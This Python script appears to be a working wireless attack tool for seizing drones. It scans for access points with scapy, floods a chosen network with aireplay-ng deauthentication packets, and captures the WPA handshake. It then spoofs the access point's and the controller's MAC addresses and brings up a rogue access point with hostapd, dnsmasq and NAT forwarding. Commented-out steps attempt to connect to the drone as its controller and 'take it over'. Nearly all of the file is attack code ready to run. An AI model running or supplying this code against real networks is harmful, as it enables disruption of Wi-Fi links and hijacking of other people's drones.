from multiprocessing import Process
from scapy.all import *
import time
import os
import conf_files as cf
import pandas as pd
import psutil

iface = ''
iface1 = ''
bssid_name = ""
essid_name = ""
channel_no = 0
bssid_list = []
essid_list = []
channel_list = []

def mac_extract():
    data = pd.read_csv('handshake-01.csv')
    mac = data.iloc[2][0]
    return mac
    
def ap_sniffer(pkt) : ##captures beacon frames
    global bssid_list, essid_list, channel_list
    # if packet has 802.11 layer
    if pkt.haslayer(Dot11Beacon):
            if pkt.addr2 not in bssid_list:
                channel = pkt.channel
                channel_list.append(channel)
                bssid = pkt[Dot11].addr2
                bssid_list.append(bssid)
                essid = pkt[Dot11Elt].info.decode()
                essid_list.append(essid)
                print(len(bssid_list),'\t ',channel,'\t ',bssid,'\t ',essid)

def deauth(dist, bssid_name, iface):
    os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface}")

def deauth1(dist, client_mac, bssid_name, iface):
    os.system(f"aireplay-ng -0 {dist} -c {client_mac} -a {bssid_name} {iface}")

def handshake_capture():
        global essid_name, bssid_name, channel_no
        mac_adder = int(input("\nEnter the index of the network you want to target: ")) - 1
        bssid_name = bssid_list[mac_adder]
        essid_name = essid_list[mac_adder]
        channel_no = channel_list[mac_adder]
        print("\nNetwork to target:\n")
        print(channel_no,'\t',bssid_name,'\t',   essid_name)
        dist = str(input("\nEnter the number of the packets [1-10000] (0 for unlimited number) "))
        print("Capturing 4-Way handshake [{}]...".format(bssid_name))
        #start deauthentication process
        #p_deauth = Process(target = deauth(dist, bssid_name, iface))
        p_deauth = Process(target = deauth, args=(dist, bssid_name, iface))
        p_deauth.start()
        os.system(f"airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
        p_deauth.terminate()
        #os.system(f"aireplay-ng -0 {dist} -a {bssid_name} {iface} | xterm -e airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
        #os.system(f"airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake | xterm -e aireplay-ng -0 {dist} -a {bssid_name} {iface}")
        #stop deauthentication process
        return essid_name

#turns the wifi interface into monitor mode for scanning
def setup_monitor(iface):
    try:
        os.system(f'airmon-ng start {iface}')
    except:
        os.system('Failed to setup interface in monitor mode')
        sys.exit(1)
    iface = str(iface)+'mon'
    return iface

def disable_monitor(iface):
    try:
        os.system(f'airmon-ng stop {iface}')
    except:
        os.system('Failed to setup interface in managed mode')
        sys.exit(1)
    iface = "wlan0"
    return iface

def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {iface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

def create_configs(iface, essid, channel_no):
    cf.create_hostapd(iface, essid, channel_no)
    cf.create_dnsmasq(iface)

def rogue_ap():
    global iface, bssid_name
    #os.system('sudo killall dnsmasq')
    os.system(f'ifconfig {iface} down')
    os.system(f'macchanger --mac={bssid_name} {iface}')
    os.system(f'ifconfig {iface} up')
    os.system(f'ifconfig {iface} up 192.168.2.1 netmask 255.255.255.0')
    #os.system(f'ifconfig {iface1} mtu 1400')
    os.system('route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1')
    #ip forwarding and adapter bridging
    os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
    os.system('iptables --append FORWARD --in-interface wlan0 -j ACCEPT')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system("dnsmasq -C dnsmasq.conf -d | xterm -hold -e hostapd hostapd.conf")
    ##look at connecting to access point without network manager
    
def main():
    global iface,iface1, essid_name, bssid_name, channel_no
    iface = setup_monitor("wlan0")
    iface1 = ("drone_wlan")
    os.system(f"iw dev wlan0mon interface add {iface1} type managed")
    print("\nWhen Done Press CTRL+C")
    time.sleep(2)
    print("Scanning for access points...")
    print("press CTRL+C to stop the scanning")
    print("Index \tChannel \t MAC \t\t ESSID")
    cc = Process(target = change_channel)
    cc.start()
    #start the ap sniffer
    sniff(iface = iface, prn = ap_sniffer) 
    cc.terminate()
    cc.join()
    handshake_capture()
    client_mac = mac_extract()
    os.system(f"ifconfig {iface1} down")
    os.system(f"ip link set dev {iface1} address {client_mac}")
    os.system(f"ifconfig {iface1} up")
    print("Fake Access Point\nWhen Done Press CTRL+C")
    time.sleep(2.0)
    #disable_monitor(iface)
    create_configs(iface, essid_name, channel_no)
    print('Drone information:',essid_name, bssid_name, channel_no)
    print('Drone controller info:',client_mac)
    input("deauth in seperate window")
    #da = Process(target = deauth, args = (0, bssid_name, iface))
    #da.start()
    rogue_ap()
    #da.terminate()

#1st method to connecting to drone
    #os.system(f"wpa_passphrase {essid_name} | sudo tee /etc/wpa_supplicant.conf")
    #os.system(f"wpa_supplicant -c /etc/wpa_supplicant.conf -i {iface}")
    #os.system('Connection to drone established')

#2nd method to connecting to drone
    #os.system('airmon-ng check kill')
    #os.system('ifconfig wlan0 down')
    #os.system(f'iwconfig wlan0 channel {channel_no}')
    #os.system('ifconfig wlan0 up')
    #os.system('dhclient -v wlan0')
    #da = Process(target = deauth, args = (0, client_mac, bssid_name, iface))
    #da.start()
    #os.system(f'ifconfig wlan0 down')
    #os.system(f'macchanger --mac={client_mac} wlan0')
    #os.system(f"iwconfig wlan0 essid {essid_name}")
    #os.system('Connection to drone established')
    #os.system(f'ifconfig wlan0 up')
    #os.system('dhclient -v wlan0')
    #os.system("well done!!! now look at controlling drone when taken over!")
    #os.system(f'iwconfig wlan0 essid {essid_name} channel {channel_no} ap {bssid_name}')
    #os.system('ifconfig wlan0 up')
    #os.system('dhclient -v wlan0')
    #os.system('Connection to drone established')
    #da.terminate()

if __name__ == "__main__":
    main()